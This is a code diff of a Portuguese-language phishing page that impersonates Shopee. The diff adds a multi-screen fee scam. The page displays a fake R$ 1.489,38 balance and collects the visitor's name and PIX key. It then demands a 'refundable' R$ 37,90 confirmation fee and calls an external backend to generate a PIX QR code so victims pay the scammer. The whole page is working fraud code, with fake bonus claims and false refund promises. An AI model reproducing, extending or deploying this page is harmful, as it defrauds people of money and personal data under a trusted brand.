@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Resgate de Saldo</title>
+    <title>Resgate Shopee</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Roboto', sans-serif; background: #f5f5f5; margin: 0; padding: 0; color: #333; min-height: 100vh; }
+        .hidden { display: none !important; }
 
-        /* --- TELA 1: DESIGN ORIGINAL --- */
+        /* --- TELA 1: HOME --- */
         .header-section { background: #ee4d2d; padding: 20px; color: white; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px; }
         .header-top { display: flex; justify-content: space-between; align-items: flex-start; }
         .coin-icon { width: 50px; height: 50px; }
@@ -17,48 +18,83 @@
         .card-white { background: white; margin: 15px; padding: 20px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
 
         .option-group { display: flex; gap: 10px; margin: 15px 0; }
-        .option-btn { border: 1px solid #f0f0f0; background: #f9f9f9; padding: 12px 0; border-radius: 6px; text-align: center; font-weight: 700; flex: 1; color: #555; }
-        .big-option { width: 100%; padding: 22px 0; font-size: 26px; font-weight: 900; border: 1px solid #f0f0f0; border-radius: 8px; text-align: center; background: #f9f9f9; }
+        .option-btn { border: 1px solid #f0f0f0; background: #f9f9f9; padding: 12px 0; border-radius: 6px; text-align: center; font-weight: 700; flex: 1; color: #555; transition: 0.2s; }
+        .big-option { width: 100%; padding: 22px 0; font-size: 26px; font-weight: 900; border: 1px solid #f0f0f0; border-radius: 8px; text-align: center; background: #f9f9f9; cursor: pointer; }
         .selected { border: 2px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }
 
-        .btn-main { background: #ee4d2d; color: white; width: 100%; padding: 18px; border: none; border-radius: 8px; font-size: 16px; font-weight: 800; text-transform: uppercase; }
+        .btn-main { background: #ee4d2d; color: white; width: 100%; padding: 18px; border: none; border-radius: 8px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; }
         .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; }
 
-        /* SELOS DE SEGURANÇA NO RODAPÉ */
-        .security-footer { display: flex; justify-content: space-around; align-items: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; }
-        .security-img { height: 30px; width: auto; filter: grayscale(100%); opacity: 0.7; }
+        /* RODAPÉ NOVO (Conforme imagem c44260) */
+        .shopee-footer-card { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
+        .shopee-text h4 { margin: 0 0 5px 0; font-size: 15px; color: #000; font-weight: 700; }
+        .shopee-text p { margin: 0; font-size: 12px; color: #666; line-height: 1.4; max-width: 250px; }
+        .shopee-logo-img { width: 40px; height: auto; }
 
-        /* --- MODAL QUE SOBE DE BAIXO (image_c3c69d.png) --- */
+        /* --- TELA 2: MODAL SHEET (Sobe de baixo) --- */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: flex; align-items: flex-end; }
         .modal-sheet { background: white; width: 100%; border-radius: 20px 20px 0 0; padding: 30px 25px; animation: slideUp 0.3s ease-out; }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        .hidden { display: none !important; }
+        
+        label { font-size: 14px; font-weight: 700; color: #444; margin-bottom: 6px; display: block; margin-top: 15px; }
+        input, select { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; }
 
-        label { font-size: 14px; font-weight: 700; color: #444; margin-bottom: 6px; display: block; margin-top: 10px; }
-        input, select { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; margin-bottom: 10px; }
+        /* --- TELA 3: CONFIRMAÇÃO (Conforme imagem c44713) --- */
+        .screen-container { padding: 15px; background: #f5f5f5; min-height: 100vh; }
+        .confirm-header { background: white; padding: 20px; border-radius: 10px; margin-bottom: 15px; }
+        .tax-highlight { color: #d32f2f; font-size: 28px; font-weight: 800; margin: 10px 0; }
+        .reembolso-tag { color: #00bfa5; font-size: 11px; font-weight: 700; text-transform: uppercase; margin-left: 10px; background: #e0f2f1; padding: 3px 8px; border-radius: 4px; }
+        
+        .data-box { background: #f9f9f9; border-radius: 8px; padding: 15px; margin-top: 15px; }
+        .data-row { display: flex; justify-content: space-between; font-size: 14px; padding: 8px 0; border-bottom: 1px solid #eee; }
+        .data-row:last-child { border-bottom: none; font-weight: 700; font-size: 16px; }
+        .data-label { color: #888; }
+        .data-val { color: #333; font-weight: 600; }
+
+        .steps-container { background: white; padding: 20px; border-radius: 10px; margin-bottom: 80px; }
+        .step-item { display: flex; gap: 15px; margin-bottom: 20px; align-items: flex-start; }
+        .step-num { background: #ffebee; color: #ee4d2d; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 12px; font-weight: bold; flex-shrink: 0; }
+        .step-check { background: #e0f2f1; color: #00bfa5; }
+        .step-txt h5 { margin: 0 0 3px 0; font-size: 14px; color: #333; }
+        .step-txt p { margin: 0; font-size: 12px; color: #888; }
+
+        /* --- TELA 4: VSL (Video) --- */
+        .vsl-header { text-align: center; padding: 20px; background: #fff; margin-bottom: 15px; }
+        .vsl-headline { font-size: 18px; font-weight: 800; color: #ee4d2d; line-height: 1.3; }
+        .video-wrapper { position: relative; padding-bottom: 56.25%; height: 0; background: #000; margin-bottom: 20px; }
+        .video-wrapper iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
+        
+        /* --- MODAL QR CODE FINAL --- */
+        .qr-content { text-align: center; padding: 30px 20px; background: #fff; border-radius: 15px; max-width: 350px; width: 90%; margin: 0 auto; position: relative; top: 50%; transform: translateY(-50%); }
+        .qr-img { width: 200px; height: 200px; margin: 15px auto; border: 1px solid #eee; padding: 5px; display: block; }
+        .pix-code { background: #f0f0f0; border: 1px solid #ccc; padding: 10px; font-size: 11px; word-break: break-all; border-radius: 5px; margin: 15px 0; height: 60px; overflow-y: scroll;}
+
     </style>
 </head>
 <body>
 
-    <div id="step-1">
+    <div id="screen-1">
         <div class="header-section">
             <div class="header-top">
                 <div>
                     <span style="font-size: 14px; opacity: 0.9;">Seu saldo</span>
-                    <div style="font-size: 42px; font-weight: 900;">R$ <span id="balance">0,00</span></div>
+                    <div style="font-size: 44px; font-weight: 900; letter-spacing: -1px;">R$ <span id="balance">0,00</span></div>
                     <div style="font-size: 13px; opacity: 0.8;">= <span id="points">0,00</span> pontos (s)</div>
                 </div>
                 <div class="coin-icon">
                     <svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="248" fill="#ffd700" stroke="#daa520" stroke-width="8"/><text x="50%" y="65%" text-anchor="middle" fill="#daa520" font-family="Arial" font-weight="bold" font-size="250">$</text></svg>
                 </div>
             </div>
-            <div style="font-size: 13px; margin-top: 12px; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 10px;">
+            <div style="font-size: 13px; margin-top: 12px; border-top: 1px solid rgba(255,255,255,0.3); padding-top: 10px;">
                 Última bonificação apresentada: R$ 845,24
             </div>
         </div>
 
-        <div class="card-white">
-            <h3 style="margin-top:0; font-size:17px;">Sacar dinheiro</h3>
+        <div class="card-white" style="margin-top: 15px;">
+            <h3 style="margin: 0 0 15px 0; font-size: 17px;">Sacar dinheiro</h3>
+            <div style="display:flex; align-items:center; gap:8px; margin-bottom:15px; font-size:14px; color:#555;">
+                <span style="font-size: 18px;">💳</span> Transferência via <strong style="color:#2c9e94;">Pix</strong>
+            </div>
             <div class="option-group">
                 <div class="option-btn" onclick="selectOpt(this)">R$1,5</div>
                 <div class="option-btn" onclick="selectOpt(this)">R$5</div>
@@ -66,28 +102,34 @@
             </div>
             <div id="big-opt" class="big-option" onclick="selectBig()">R$ 1.489,38</div>
             <button id="btn-sacar" class="btn-main btn-disabled" onclick="openModal()">SACAR DINHEIRO</button>
+            <p style="font-size:12px; color:#999; text-align:center; margin-top:15px; line-height:1.4;">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5.</p>
         </div>
 
         <div class="card-white">
-            <h3 style="font-size:15px; margin-bottom:5px;">Acesso Prioritário</h3>
-            <p style="font-size:12px; color:#777;">Sua transação é monitorada e garantida por órgãos reguladores.</p>
-            <div class="security-footer">
-                <img src="https://logodownload.org/wp-content/uploads/2017/08/bacen-logo.png" class="security-img">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="security-img">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="security-img">
+            <div class="shopee-footer-card">
+                <div class="shopee-text">
+                    <h4>Obtenha seu acesso exclusivo</h4>
+                    <p>Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis de forma rápida, segura e sem complicações.</p>
+                </div>
+                <svg class="shopee-logo-img" viewBox="0 0 192 192" fill="none">
+                    <rect width="192" height="192" rx="30" fill="#EE4D2D"/>
+                    <path d="M145 74.5C145 74.5 130.5 54 96 54C61.5 54 47 74.5 47 74.5" stroke="white" stroke-width="12" stroke-linecap="round"/>
+                    <path d="M64 95C64 95 72 110 96 110C120 110 128 95 128 95" stroke="white" stroke-width="8" stroke-linecap="round"/>
+                </svg>
             </div>
         </div>
     </div>
 
-    <div id="modal-pix" class="modal-overlay hidden">
+
+    <div id="modal-user-data" class="modal-overlay hidden">
         <div class="modal-sheet">
             <h2 style="text-align:center; font-size:20px; margin-bottom:20px; margin-top:0;">Vincular Chave PIX</h2>
             
             <label>Nome completo do titular</label>
-            <input type="text" id="nome" placeholder="Nome completo">
+            <input type="text" id="input-nome" placeholder="Nome completo">
 
             <label>Tipo de chave PIX</label>
-            <select id="tipo-chave" onchange="mudarLabel()">
+            <select id="input-tipo" onchange="mudarLabel()">
                 <option value="cpf">CPF</option>
                 <option value="cel">Celular</option>
                 <option value="email">E-mail</option>
@@ -95,65 +137,233 @@
             </select>
 
             <label id="label-chave">Chave PIX (Apenas números)</label>
-            <input type="tel" id="chave-pix" placeholder="000.000.000-00">
+            <input type="tel" id="input-chave" placeholder="000.000.000-00">
 
-            <button class="btn-main" onclick="irParaProximo()">CONFIRMAR E CONTINUAR</button>
+            <button class="btn-main" style="margin-top: 25px;" onclick="goToConfirmation()">CONFIRMAR E CONTINUAR</button>
+            
             <div style="text-align:center; margin-top:15px; font-size:11px; color:#888; display:flex; align-items:center; justify-content:center; gap:5px;">
                 🔒 Transação criptografada
             </div>
         </div>
     </div>
 
+
+    <div id="screen-confirmation" class="screen-container hidden">
+        <h2 style="font-size: 28px; font-weight: 900; margin: 10px 0 5px 0;">R$ 1.489,38</h2>
+        <p style="color:#666; font-size:14px; margin-bottom:20px;">Aguardando confirmação para saque</p>
+
+        <div class="confirm-header">
+            <h4 style="margin:0; font-size:13px; color:#555; text-transform:uppercase;">Confirmação de Identidade</h4>
+            <div style="display:flex; align-items:center;">
+                <div class="tax-highlight">R$ 37,90</div>
+                <div class="reembolso-tag">Valor Reembolsável</div>
+            </div>
+            <p style="font-size:13px; color:#555; margin:0; line-height:1.4;">Taxa obrigatória para liberação do bônus. O valor será reembolsado integralmente em 1 minuto.</p>
+
+            <div class="data-box">
+                <div style="font-size:11px; color:#999; font-weight:700; margin-bottom:10px; text-transform:uppercase;">Dados para Reembolso</div>
+                <div class="data-row">
+                    <span class="data-label">Nome</span>
+                    <span class="data-val" id="display-nome">...</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">Data</span>
+                    <span class="data-val" id="display-data">...</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">Chave PIX</span>
+                    <span class="data-val" id="display-chave">...</span>
+                </div>
+                <div class="data-row" style="border-top:1px solid #ddd; margin-top:5px; padding-top:10px;">
+                    <span>Valor a receber</span>
+                    <span style="font-size:18px;">R$ 1.489,38</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="steps-container">
+            <div style="font-size:11px; color:#555; font-weight:700; margin-bottom:15px; text-transform:uppercase;">Processo de Liberação</div>
+            
+            <div class="step-item">
+                <div class="step-num">1</div>
+                <div class="step-txt">
+                    <h5>Pagar taxa de confirmação</h5>
+                    <p>R$ 37,90 para verificação</p>
+                </div>
+            </div>
+            <div class="step-item">
+                <div class="step-num step-check">✓</div>
+                <div class="step-txt">
+                    <h5 style="color:#00bfa5;">Receber reembolso automático</h5>
+                    <p>Valor devolvido em 1 minuto</p>
+                </div>
+            </div>
+            <div class="step-item">
+                <div class="step-num" style="background:#eee; color:#999;">3</div>
+                <div class="step-txt">
+                    <h5>Acessar saldo completo</h5>
+                    <p>R$ 1.489,38 liberado para saque</p>
+                </div>
+            </div>
+
+            <button class="btn-main" onclick="goToVSL()">GERAR PIX</button>
+        </div>
+    </div>
+
+
+    <div id="screen-vsl" class="screen-container hidden" style="background:white;">
+        <div class="vsl-header">
+            <div class="vsl-headline">ASSISTA AO VÍDEO ABAIXO PARA LIBERAR SEU SAQUE IMEDIATAMENTE</div>
+        </div>
+
+        <div class="video-wrapper">
+             <iframe src="https://recuperabonushopp.com/elementor-1623" allow="autoplay; fullscreen" allowfullscreen></iframe>
+        </div>
+
+        <div style="padding: 20px;">
+            <p style="text-align:center; font-size:14px; color:#555; margin-bottom:20px;">
+                👇 Clique no botão abaixo para finalizar e receber o pix agora.
+            </p>
+            
+            <button id="btn-final-pay" class="btn-main" onclick="gerarPixFinal()">
+                PAGAR TAXA E RECEBER SALDO
+            </button>
+        </div>
+    </div>
+
+
+    <div id="modal-qr" class="modal-overlay hidden" style="background:rgba(0,0,0,0.8);">
+        <div class="qr-content">
+            <h3 style="margin-top:0; color:#333;">Pagamento Pix</h3>
+            <p style="font-size:13px; color:#666;">Copie o código e pague no app do seu banco.</p>
+            
+            <img id="qr-image" class="qr-img" src="" alt="QR Code">
+            
+            <div style="text-align:left; font-size:12px; font-weight:700; color:#444;">Pix Copia e Cola:</div>
+            <textarea id="pix-text" class="pix-code" readonly></textarea>
+            
+            <button class="btn-main" onclick="copiarPix()">COPIAR CÓDIGO</button>
+            <button onclick="document.getElementById('modal-qr').classList.add('hidden')" style="margin-top:10px; background:none; border:none; color:#999;">Fechar</button>
+        </div>
+    </div>
+
+
     <script>
-        // CONTADOR ANIMADO
+        const API_URL = "https://checkout-pix-profissional.onrender.com";
+
+        // 1. ANIMAÇÃO DE SALDO
         function animate(id, target) {
             let current = 0;
             const el = document.getElementById(id);
-            const step = target / 50;
-            const timer = setInterval(() => {
+            const step = target / 40;
+            const t = setInterval(() => {
                 current += step;
-                if (current >= target) { el.innerText = target.toLocaleString('pt-BR', {minimumFractionDigits: 2}); clearInterval(timer); }
-                else { el.innerText = current.toLocaleString('pt-BR', {minimumFractionDigits: 2}); }
+                if(current >= target) { el.innerText = target.toLocaleString('pt-BR',{minimumFractionDigits:2}); clearInterval(t); }
+                else el.innerText = current.toLocaleString('pt-BR',{minimumFractionDigits:2});
             }, 30);
         }
-        window.onload = () => { animate('balance', 1489.38); animate('points', 42583.05); };
+        window.onload = () => { animate('balance',1489.38); animate('points',42583.05); };
 
-        // LOGICA DE SELEÇÃO
-        let selecionado = false;
-        function selectOpt(el) { document.querySelectorAll('.option-btn, .big-option').forEach(b => b.classList.remove('selected')); el.classList.add('selected'); ativar(); }
-        function selectBig() { document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected')); document.getElementById('big-opt').classList.add('selected'); ativar(); }
-        function ativar() { document.getElementById('btn-sacar').classList.remove('btn-disabled'); selecionado = true; }
-        function openModal() { if(selecionado) document.getElementById('modal-pix').classList.remove('hidden'); }
-
-        // MUDANÇA DINÂMICA DO MODAL
-        function mudarLabel() {
-            const tipo = document.getElementById('tipo-chave').value;
-            const label = document.getElementById('label-chave');
-            const input = document.getElementById('chave-pix');
-            input.value = "";
-
-            if(tipo === 'cpf') { label.innerText = "Chave PIX (CPF)"; input.placeholder = "000.000.000-00"; input.type = "tel"; }
-            else if(tipo === 'cel') { label.innerText = "Chave PIX (Celular)"; input.placeholder = "(00) 00000-0000"; input.type = "tel"; }
-            else if(tipo === 'email') { label.innerText = "Chave PIX (E-mail)"; input.placeholder = "exemplo@email.com"; input.type = "email"; }
-            else { label.innerText = "Chave Aleatória"; input.placeholder = "Cole sua chave aqui"; input.type = "text"; }
-        }
+        // 2. NAVEGAÇÃO
+        let valSelected = false;
+        function selectOpt(e) { document.querySelectorAll('.option-btn,.big-option').forEach(b=>b.classList.remove('selected')); e.classList.add('selected'); valSelected=true; document.getElementById('btn-sacar').classList.remove('btn-disabled'); }
+        function selectBig() { selectOpt(document.getElementById('big-opt')); }
+        function openModal() { if(valSelected) document.getElementById('modal-user-data').classList.remove('hidden'); }
 
         // MÁSCARAS
-        document.getElementById('chave-pix').addEventListener('input', e => {
-            const tipo = document.getElementById('tipo-chave').value;
+        function mudarLabel() {
+            const tipo = document.getElementById('input-tipo').value;
+            const inp = document.getElementById('input-chave');
+            inp.value = "";
+            if(tipo==='cpf') { inp.placeholder="000.000.000-00"; inp.type="tel"; }
+            else if(tipo==='cel') { inp.placeholder="(00) 00000-0000"; inp.type="tel"; }
+            else if(tipo==='email') { inp.placeholder="email@exemplo.com"; inp.type="email"; }
+            else { inp.placeholder="Chave aleatória"; inp.type="text"; }
+        }
+        document.getElementById('input-chave').addEventListener('input', function(e){
+            const tipo = document.getElementById('input-tipo').value;
             let v = e.target.value.replace(/\D/g,"");
-            if(tipo === 'cpf') {
-                v = v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");
-                e.target.value = v;
-            } else if(tipo === 'cel') {
-                v = v.replace(/^(\d{2})(\d)/g,"($1) $2").replace(/(\d)(\d{4})$/,"$1-$2");
-                e.target.value = v;
-            }
+            if(tipo==='cpf') { v=v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2"); e.target.value=v; }
+            else if(tipo==='cel') { v=v.replace(/^(\d{2})(\d)/g,"($1) $2").replace(/(\d)(\d{4})$/,"$1-$2"); e.target.value=v; }
         });
 
-        function irParaProximo() {
-            if(document.getElementById('nome').value.length < 5) return alert("Digite seu nome completo.");
-            window.location.href = "iof.html";
+        // 3. IR PARA CONFIRMAÇÃO (Preenche dados)
+        function goToConfirmation() {
+            const nome = document.getElementById('input-nome').value;
+            const chave = document.getElementById('input-chave').value;
+            
+            if(nome.length < 3 || chave.length < 4) return alert("Preencha os dados corretamente.");
+
+            // Preenche a tela 3
+            document.getElementById('display-nome').innerText = nome;
+            document.getElementById('display-chave').innerText = chave;
+            
+            const hoje = new Date();
+            const dia = String(hoje.getDate()).padStart(2,'0');
+            const mes = String(hoje.getMonth()+1).padStart(2,'0');
+            document.getElementById('display-data').innerText = `${dia}/${mes}/${hoje.getFullYear()}`;
+
+            // Troca de tela (SPA)
+            document.getElementById('modal-user-data').classList.add('hidden');
+            document.getElementById('screen-1').classList.add('hidden');
+            document.getElementById('screen-confirmation').classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        // 4. IR PARA VSL (Instantâneo)
+        function goToVSL() {
+            document.getElementById('screen-confirmation').classList.add('hidden');
+            document.getElementById('screen-vsl').classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        // 5. GERAR PIX FINAL (API)
+        async function gerarPixFinal() {
+            const btn = document.getElementById('btn-final-pay');
+            const nome = document.getElementById('input-nome').value;
+            const cpf = "00000000000"; // CPF genérico se não for chave CPF, ou extrair se for.
+            const email = "cliente@email.com"; // Opcional
+
+            btn.disabled = true;
+            btn.innerText = "GERANDO...";
+
+            try {
+                // Chama seu backend na Render
+                const response = await fetch(`${API_URL}/vizzion-pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        name: nome, 
+                        email: email, 
+                        cpf: cpf,
+                        amount: 3790 // Taxa de 37,90 (em centavos se a API pedir, ou float)
+                    })
+                });
+
+                const data = await response.json();
+
+                if(data.qr_imagem || data.qr_copia) {
+                    let img = data.qr_imagem;
+                    if(!img.startsWith('data:')) img = `data:image/png;base64,${img}`;
+                    
+                    document.getElementById('qr-image').src = img;
+                    document.getElementById('pix-text').value = data.qr_copia;
+                    document.getElementById('modal-qr').classList.remove('hidden');
+                } else {
+                    alert("Erro ao gerar Pix. Tente novamente.");
+                }
+            } catch (error) {
+                alert("Erro de conexão com o servidor.");
+            }
+            btn.disabled = false;
+            btn.innerText = "PAGAR TAXA E RECEBER SALDO";
+        }
+
+        function copiarPix() {
+            const t = document.getElementById('pix-text');
+            t.select();
+            document.execCommand('copy');
+            alert("Código copiado!");
         }
     </script>
 </body>
